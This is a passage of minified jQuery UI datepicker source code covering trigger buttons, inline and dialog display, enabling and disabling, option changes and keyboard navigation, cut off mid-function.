class="'+this._appendClass+'">'+c+"</span>");a[e?"before":"after"](b.append)}a.unbind("focus",this._showDatepicker);b.trigger&&b.trigger.remove();c=this._get(b,"showOn");if(c=="focus"||c=="both")a.focus(this._showDatepicker);if(c=="button"||c=="both"){c=this._get(b,"buttonText");var f=this._get(b,"buttonImage");b.trigger=d(this._get(b,"buttonImageOnly")?d("<img/>").addClass(this._triggerClass).attr({src:f,alt:c,title:c}):d('<button type="button"></button>').addClass(this._triggerClass).html(f==""?c:d("<img/>").attr({src:f,alt:c,title:c})));a[e?"before":"after"](b.trigger);b.trigger.click(function(){d.datepicker._datepickerShowing&&d.datepicker._lastInput==a[0]?d.datepicker._hideDatepicker():d.datepicker._showDatepicker(a[0]);return false})}},_autoSize:function(a){if(this._get(a,"autoSize")&&!a.inline){var b=new Date(2009,11,20),c=this._get(a,"dateFormat");if(c.match(/[DM]/)){var e=function(f){for(var h=0,i=0,g=0;g<f.length;g++)if(f[g].length>h){h=f[g].length;i=g}return i};b.setMonth(e(this._get(a,c.match(/MM/)?"monthNames":"monthNamesShort")));b.setDate(e(this._get(a,c.match(/DD/)?"dayNames":"dayNamesShort"))+20-b.getDay())}a.input.attr("size",this._formatDate(a,b).length)}},_inlineDatepicker:function(a,b){var c=d(a);if(!c.hasClass(this.markerClassName)){c.addClass(this.markerClassName).append(b.dpDiv).bind("setData.datepicker",function(e,f,h){b.settings[f]=h}).bind("getData.datepicker",function(e,f){return this._get(b,f)});d.data(a,"datepicker",b);this._setDate(b,this._getDefaultDate(b),true);this._updateDatepicker(b);this._updateAlternate(b);b.settings.disabled&&this._disableDatepicker(a);b.dpDiv.css("display","block")}},_dialogDatepicker:function(a,b,c,e,f){a=this._dialogInst;if(!a){this.uuid+=1;this._dialogInput=d('<input type="text" id="'+("dp"+this.uuid)+'" style="position: absolute; top: -100px; width: 0px; z-index: -10;"/>');this._dialogInput.keydown(this._doKeyDown);d("body").append(this._dialogInput);a=this._dialogInst=this._newInst(this._dialogInput,false);a.settings={};d.data(this._dialogInput[0],"datepicker",a)}H(a.settings,e||{});b=b&&b.constructor==Date?this._formatDate(a,b):b;this._dialogInput.val(b);this._pos=f?f.length?f:[f.pageX,f.pageY]:null;if(!this._pos)this._pos=[document.documentElement.clientWidth/2-100+(document.documentElement.scrollLeft||document.body.scrollLeft),document.documentElement.clientHeight/2-150+(document.documentElement.scrollTop||document.body.scrollTop)];this._dialogInput.css("left",this._pos[0]+20+"px").css("top",this._pos[1]+"px");a.settings.onSelect=c;this._inDialog=true;this.dpDiv.addClass(this._dialogClass);this._showDatepicker(this._dialogInput[0]);d.blockUI&&d.blockUI(this.dpDiv);d.data(this._dialogInput[0],"datepicker",a);return this},_destroyDatepicker:function(a){var b=d(a),c=d.data(a,"datepicker");if(b.hasClass(this.markerClassName)){var e=a.nodeName.toLowerCase();d.removeData(a,"datepicker");if(e=="input"){c.append.remove();c.trigger.remove();b.removeClass(this.markerClassName).unbind("focus",this._showDatepicker).unbind("keydown",this._doKeyDown).unbind("keypress",this._doKeyPress).unbind("keyup",this._doKeyUp)}else if(e=="div"||e=="span")b.removeClass(this.markerClassName).empty()}},_enableDatepicker:function(a){var b=d(a),c=d.data(a,"datepicker");if(b.hasClass(this.markerClassName)){var e=a.nodeName.toLowerCase();if(e=="input"){a.disabled=false;c.trigger.filter("button").each(function(){this.disabled=false}).end().filter("img").css({opacity:"1.0",cursor:""})}else if(e=="div"||e=="span"){b=b.children("."+this._inlineClass);b.children().removeClass("ui-state-disabled");b.find("select.ui-datepicker-month, select.ui-datepicker-year").removeAttr("disabled")}this._disabledInputs=d.map(this._disabledInputs,function(f){return f==a?null:f})}},_disableDatepicker:function(a){var b=d(a),c=d.data(a,"datepicker");if(b.hasClass(this.markerClassName)){var e=a.nodeName.toLowerCase();if(e=="input"){a.disabled=true;c.trigger.filter("button").each(function(){this.disabled=true}).end().filter("img").css({opacity:"0.5",cursor:"default"})}else if(e=="div"||e=="span"){b=b.children("."+this._inlineClass);b.children().addClass("ui-state-disabled");b.find("select.ui-datepicker-month, select.ui-datepicker-year").attr("disabled","disabled")}this._disabledInputs=d.map(this._disabledInputs,function(f){return f==a?null:f});this._disabledInputs[this._disabledInputs.length]=a}},_isDisabledDatepicker:function(a){if(!a)return false;for(var b=0;b<this._disabledInputs.length;b++)if(this._disabledInputs[b]==a)return true;return false},_getInst:function(a){try{return d.data(a,"datepicker")}catch(b){throw"Missing instance data for this datepicker";}},_optionDatepicker:function(a,b,c){var e=this._getInst(a);if(arguments.length==2&&typeof b=="string")return b=="defaults"?d.extend({},d.datepicker._defaults):e?b=="all"?d.extend({},e.settings):this._get(e,b):null;var f=b||{};if(typeof b=="string"){f={};f[b]=c}if(e){this._curInst==e&&this._hideDatepicker();var h=this._getDateDatepicker(a,true),i=this._getMinMaxDate(e,"min"),g=this._getMinMaxDate(e,"max");H(e.settings,f);if(i!==null&&f.dateFormat!==C&&f.minDate===C)e.settings.minDate=this._formatDate(e,i);if(g!==null&&f.dateFormat!==C&&f.maxDate===C)e.settings.maxDate=this._formatDate(e,g);this._attachments(d(a),e);this._autoSize(e);this._setDate(e,h);this._updateAlternate(e);this._updateDatepicker(e)}},_changeDatepicker:function(a,b,c){this._optionDatepicker(a,b,c)},_refreshDatepicker:function(a){(a=this._getInst(a))&&this._updateDatepicker(a)},_setDateDatepicker:function(a,b){if(a=this._getInst(a)){this._setDate(a,b);this._updateDatepicker(a);this._updateAlternate(a)}},_getDateDatepicker:function(a,b){(a=this._getInst(a))&&!a.inline&&this._setDateFromField(a,b);return a?this._getDate(a):null},_doKeyDown:function(a){var b=d.datepicker._getInst(a.target),c=true,e=b.dpDiv.is(".ui-datepicker-rtl");b._keyEvent=true;if(d.datepicker._datepickerShowing)switch(a.keyCode){case 9:d.datepicker._hideDatepicker();c=false;break;case 13:c=d("td."+d.datepicker._dayOverClass+":not(."+d.datepicker._currentClass+")",b.dpDiv);c[0]&&d.datepicker._selectDay(a.target,b.selectedMonth,b.selectedYear,c[0]);if(a=d.datepicker._get(b,"onSelect")){c=d.datepicker._formatDate(b);a.apply(b.input?b.input[0]:null,[c,b])}else d.datepicker._hideDatepicker();return false;case 27:d.datepicker._hideDatepicker();break;case 33:d.datepicker._adjustDate(a.target,a.ctrlKey?-d.datepicker._get(b,"stepBigMonths"):-d.datepicker._get(b,"stepMonths"),"M");break;case 34:d.datepicker._adjustDate(a.target,a.ctrlKey?+d.datepicker._get(b,"stepBigMonths"):+d.datepicker._get(b,"stepMonths"),"M");break;case 35:if(a.ctrlKey||a.metaKey)d.datepicker._clearDate(a.target);c=a.ctrlKey||a.metaKey;break;case 36:if(a.ctrlKey||a.metaKey)d.datepicker._gotoToday(a.target);c=a.ctrlKey||a.metaKey;break;case 37:if(a.ctrlKey||a.metaKey)d.datepicker._adjustDate(a.target,e?+1:-1,"D");c=a.ctrlKey||a.metaKey;if(a.originalEvent.altKey)d.datepicker._adjustDate(a.target,a.ctrlKey?-d.datepicker._get(b,"stepBigMonths"):-d.datepicker._get(b,"stepMonths"),"M");break;case 38:if(a.ctrlKey||a.metaKey)d.datepicker._adjustDate(a.target,-7,"D");c=a.ctrlKey||a.metaKey;break;case 39:if(a.ctrlKey||a.metaKey)d.datepicker._adjustDate(a.target,e?-1:+1,"D");c=a.ctrlKey||a.metaKey;if(a.originalEvent.altKey)d.datepicker._adjustDate(a.target,a.ctrlKey?+d.datepicker._get(b,"stepBigMonths"):+d.datepicker._get(b,"stepMonths"),"M");break;case 40:if(a.ctrlKey||a.metaKey)d.datepicker._adjustDate(a.target,+7,"D");c=a.ctrlKey||a.metaKey;break;default:c=false}else if(a.keyCode==36&&a.ctrlKey)d.datepicker._showDatepicker(this);else c=false;if(c){a.preventDefault();a.stopPropagation()}},_doKeyPress:function(a){var b=d.datepicker._getInst(a.target);if(d.datepicker._get(b,"constrainInput")){b=d.datepicker._possibleChars(d.datepicker._get(b,"dateFormat"));var c=String.fromCharCode(a.charCode==C?a.keyCode:a.charCode);return a.ctrlKey||a.metaKey||c<" "||!b||b.indexOf(c)>-1}},_doKeyUp:function(a){a=d.datepicker._getpower tools